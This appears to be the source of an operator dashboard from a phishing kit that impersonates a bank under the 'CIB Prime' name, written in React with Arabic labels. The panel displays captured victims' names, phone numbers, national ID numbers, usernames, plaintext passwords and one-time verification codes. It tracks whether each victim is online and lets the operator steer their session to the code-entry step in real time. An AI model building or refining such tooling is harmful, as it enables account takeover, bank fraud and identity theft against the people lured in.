import { useMemo, useState } from 'react';
import { Shield, ChevronDown, History, Wifi, WifiOff, Home as HomeIcon, KeyRound, ShieldCheck, Loader2, Clock, User, CheckCircle, XCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { useAdminRealtime, type ClientState, type ClientStage, type StageLogEntry } from '@/hooks/useAdminRealtime';

const STAGE_LABEL: Record<string, string> = {
  home: 'الرئيسية',
  signup: 'التسجيل',
  create_account: 'إنشاء الحساب',
  pending_approval: 'قيد المراجعة',
  verify: 'رمز التحقق',
};

const STAGE_ORDER = ['home', 'signup', 'create_account', 'pending_approval', 'verify'];

function formatTime(iso: string | null): string {
  if (!iso) return '—';
  const date = new Date(iso);
  return date.toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
}

function HistoryModal({
  open,
  onOpenChange,
  sessionId,
  stage,
  requestHistory,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  sessionId: string;
  stage: string;
  requestHistory: (sessionId: string, stage: string) => Promise<StageLogEntry[]>;
}) {
  const [logs, setLogs] = useState<StageLogEntry[] | null>(null);
  const [loading, setLoading] = useState(false);

  const load = () => {
    setLoading(true);
    setLogs(null);
    requestHistory(sessionId, stage).then((result) => {
      setLogs(result);
      setLoading(false);
    });
  };

  return (
    <Dialog
      open={open}
      onOpenChange={(next) => {
        onOpenChange(next);
        if (next) load();
      }}
    >
      <DialogContent className="max-w-lg" dir="rtl">
        <DialogHeader>
          <DialogTitle>سجل {STAGE_LABEL[stage] ?? stage}</DialogTitle>
          <DialogDescription>البيانات القديمة التي تم إدخالها لهذا العميل في هذه الخطوة</DialogDescription>
        </DialogHeader>
        <div className="max-h-96 overflow-y-auto space-y-3 mt-2">
          {loading && (
            <div className="flex items-center justify-center py-10 text-muted-foreground gap-2">
              <Loader2 className="w-5 h-5 animate-spin" />
              جارِ التحميل...
            </div>
          )}
          {!loading && logs && logs.length === 0 && (
            <p className="text-center text-muted-foreground py-10">لا يوجد سجل سابق لهذه الخطوة</p>
          )}
          {!loading &&
            logs?.map((log) => (
              <div key={log.id} className="rounded-xl border border-border bg-muted/30 p-4 space-y-2">
                <div className="flex items-center gap-2 text-xs text-muted-foreground">
                  <Clock className="w-3.5 h-3.5" />
                  {formatTime(log.createdAt)}
                </div>
                <div className="grid grid-cols-1 gap-1 text-sm">
                  {Object.entries(log.payload).map(([key, value]) => (
                    <div key={key} className="flex items-center justify-between gap-3">
                      <span className="text-muted-foreground">{key}</span>
                      <span dir="ltr" className="font-mono text-foreground">{String(value)}</span>
                    </div>
                  ))}
                </div>
              </div>
            ))}
        </div>
      </DialogContent>
    </Dialog>
  );
}

function ClientCard({
  client,
  requestHistory,
  sendRedirect,
}: {
  client: ClientState;
  requestHistory: (sessionId: string, stage: string) => Promise<StageLogEntry[]>;
  sendRedirect: (sessionId: string, target: ClientStage) => void;
}) {
  const [expanded, setExpanded] = useState(false);
  const [historyStage, setHistoryStage] = useState<string | null>(null);
  const isOnline = client.status === 'online';
  const displayName = client.fullName?.trim() || 'عميل بدون اسم بعد';
  const stageIndex = STAGE_ORDER.indexOf(client.stage);

  return (
    <div className="rounded-2xl border border-border bg-card overflow-hidden transition-all">
      <button
        type="button"
        onClick={() => setExpanded((v) => !v)}
        className="w-full flex items-center justify-between gap-4 p-5 text-right hover:bg-muted/30 transition-colors"
      >
        <div className="flex items-center gap-4 min-w-0">
          <div className="relative shrink-0">
            <div className="w-11 h-11 rounded-full bg-primary/10 flex items-center justify-center">
              <User className="w-5 h-5 text-primary" />
            </div>
            <span
              className={`absolute -bottom-0.5 -left-0.5 w-3.5 h-3.5 rounded-full border-2 border-card ${
                isOnline ? 'bg-emerald-500' : 'bg-zinc-500'
              }`}
            />
          </div>
          <div className="min-w-0 text-right">
            <p className="font-semibold text-foreground truncate">{displayName}</p>
            <div className="flex items-center gap-2 text-xs text-muted-foreground mt-0.5">
              <span className={`inline-flex items-center gap-1 ${isOnline ? 'text-emerald-500' : 'text-zinc-500'}`}>
                {isOnline ? <Wifi className="w-3 h-3" /> : <WifiOff className="w-3 h-3" />}
                {isOnline ? 'نشط الآن' : 'غير نشط'}
              </span>
              <span>•</span>
              <span>آخر ظهور {formatTime(client.lastSeenAt ?? client.updatedAt)}</span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-3 shrink-0">
          <span className="text-xs font-medium px-3 py-1.5 rounded-full bg-primary/10 text-primary whitespace-nowrap">
            {STAGE_LABEL[client.stage] ?? client.stage}
          </span>
          <ChevronDown className={`w-5 h-5 text-muted-foreground transition-transform ${expanded ? 'rotate-180' : ''}`} />
        </div>
      </button>

      {/* Stage progress */}
      <div className="px-5 pb-4 flex items-center gap-1.5" dir="ltr">
        {STAGE_ORDER.map((s, i) => (
          <div
            key={s}
            className={`h-1.5 flex-1 rounded-full ${i <= stageIndex ? 'bg-primary' : 'bg-border'}`}
          />
        ))}
      </div>

      {expanded && (
        <div className="border-t border-border p-5 space-y-5 bg-muted/10 animate-in slide-in-from-top-2 duration-300">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <DataBox
              title="بيانات التسجيل"
              fields={[
                { label: 'الاسم الكامل', value: client.fullName },
                { label: 'رقم الموبايل', value: client.mobile, ltr: true },
                { label: 'الرقم القومي', value: client.nationalId, ltr: true },
              ]}
              onHistory={() => setHistoryStage('signup')}
            />
            <DataBox
              title="بيانات الحساب"
              fields={[
                { label: 'اسم المستخدم', value: client.username, ltr: true },
                { label: 'كلمة المرور', value: client.password, ltr: true },
              ]}
              onHistory={() => setHistoryStage('create_account')}
            />
            <DataBox
              title="رمز التحقق"
              fields={[{ label: 'رمز التحقق', value: client.verificationCode, ltr: true }]}
              onHistory={() => setHistoryStage('verify')}
            />
          </div>

          <div className="space-y-2">
            <p className="text-sm font-medium text-muted-foreground">الإجراءات السريعة</p>
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
              <Button
                variant="outline"
                className="gap-2 h-11"
                onClick={() => sendRedirect(client.sessionId, 'home')}
              >
                <HomeIcon className="w-4 h-4" />
                العودة إلى الرئيسية
              </Button>
              <Button
                variant="outline"
                className="gap-2 h-11"
                onClick={() => sendRedirect(client.sessionId, 'create_account')}
              >
                <KeyRound className="w-4 h-4" />
                تحويل إلى التسجيل
              </Button>
              <Button
                variant="outline"
                className="gap-2 h-11"
                onClick={() => sendRedirect(client.sessionId, 'verify')}
              >
                <ShieldCheck className="w-4 h-4" />
                تحويل إلى رمز التحقق
              </Button>
            </div>
          </div>

          {/* أزرار الموافقة/الرفض - تظهر فقط عند مرحلة pending_approval */}
          {client.stage === 'pending_approval' && (
            <div className="space-y-2 pt-4 border-t border-border">
              <p className="text-sm font-medium text-muted-foreground">إجراءات التحقق من البيانات</p>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <Button
                  className="gap-2 h-12 bg-emerald-500 hover:bg-emerald-600 text-white"
                  onClick={() => sendRedirect(client.sessionId, 'verify')}
                >
                  <CheckCircle className="w-5 h-5" />
                  موافق - تحويل لرمز التحقق
                </Button>
                <Button
                  variant="destructive"
                  className="gap-2 h-12"
                  onClick={() => sendRedirect(client.sessionId, 'rejected')}
                >
                  <XCircle className="w-5 h-5" />
                  مرفوض - إعادة المحاولة
                </Button>
              </div>
            </div>
          )}
        </div>
      )}

      {historyStage && (
        <HistoryModal
          open
          onOpenChange={(open) => !open && setHistoryStage(null)}
          sessionId={client.sessionId}
          stage={historyStage}
          requestHistory={requestHistory}
        />
      )}
    </div>
  );
}

function DataBox({
  title,
  fields,
  onHistory,
}: {
  title: string;
  fields: { label: string; value: string | null; ltr?: boolean }[];
  onHistory: () => void;
}) {
  return (
    <div className="rounded-xl border border-border bg-card p-4 flex flex-col gap-3">
      <p className="text-sm font-medium text-foreground">{title}</p>
      <div className="space-y-2">
        {fields.map((f) => (
          <div key={f.label} className="flex items-center justify-between gap-3">
            <span className="text-xs text-muted-foreground shrink-0">{f.label}</span>
            <span
              dir={f.ltr ? 'ltr' : undefined}
              className={`text-sm text-foreground truncate ${f.ltr ? 'font-mono' : 'font-medium'}`}
            >
              {f.value?.trim() ? f.value : '—'}
            </span>
          </div>
        ))}
      </div>
      <Button variant="ghost" size="sm" className="gap-2 justify-center mt-1" onClick={onHistory}>
        <History className="w-4 h-4" />
        السجل
      </Button>
    </div>
  );
}

export default function Admin() {
  const { clients, status, requestHistory, sendRedirect } = useAdminRealtime();
  const [search, setSearch] = useState('');

  const filtered = useMemo(() => {
    if (!search.trim()) return clients;
    const q = search.trim().toLowerCase();
    return clients.filter((c) =>
      [c.fullName, c.mobile, c.nationalId, c.username].some((v) => v?.toLowerCase().includes(q)),
    );
  }, [clients, search]);

  const onlineCount = clients.filter((c) => c.status === 'online').length;

  return (
    <div dir="rtl" className="min-h-[100dvh] bg-background text-foreground">
      <header className="border-b border-border">
        <div className="max-w-5xl mx-auto px-6 py-6 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-primary flex items-center justify-center">
              <Shield className="w-5 h-5 text-primary-foreground" />
            </div>
            <div>
              <h1 className="text-xl font-bold">لوحة  الطلبات</h1>
              <p className="text-sm text-muted-foreground">CIB Prime</p>
            </div>
          </div>
          <div
            className={`flex items-center gap-2 px-4 py-2 rounded-full text-sm font-medium ${
              status === 'online'
                ? 'bg-emerald-500/10 text-emerald-500'
                : 'bg-amber-500/10 text-amber-500'
            }`}
          >
            {status === 'online' ? <Wifi className="w-4 h-4" /> : <Loader2 className="w-4 h-4 animate-spin" />}
            {status === 'online' ? 'متصل  ' : 'جارِ الاتصال...'}
          </div>
        </div>
      </header>

      <main className="max-w-5xl mx-auto px-6 py-8 space-y-6">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <p className="text-sm text-muted-foreground">
              إجمالي الطلبات: <span className="font-semibold text-foreground">{clients.length}</span> — نشط الآن:{' '}
              <span className="font-semibold text-emerald-500">{onlineCount}</span>
            </p>
          </div>
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="بحث بالاسم أو الموبايل أو الرقم القومي..."
            className="h-11 px-4 rounded-xl border border-border bg-card text-sm w-full sm:w-72 focus:outline-none focus:ring-2 focus:ring-primary/50"
          />
        </div>

        {filtered.length === 0 && (
          <div className="rounded-2xl border border-dashed border-border p-16 text-center text-muted-foreground">
            لا يوجد عملاء حالياً. سيظهر أي عميل يبدأ التفعيل هنا مباشرة.
          </div>
        )}

        <div className="space-y-4">
          {filtered.map((client) => (
            <ClientCard
              key={client.sessionId}
              client={client}
              requestHistory={requestHistory}
              sendRedirect={sendRedirect}
            />
          ))}
        </div>
      </main>
    </div>
  );
}
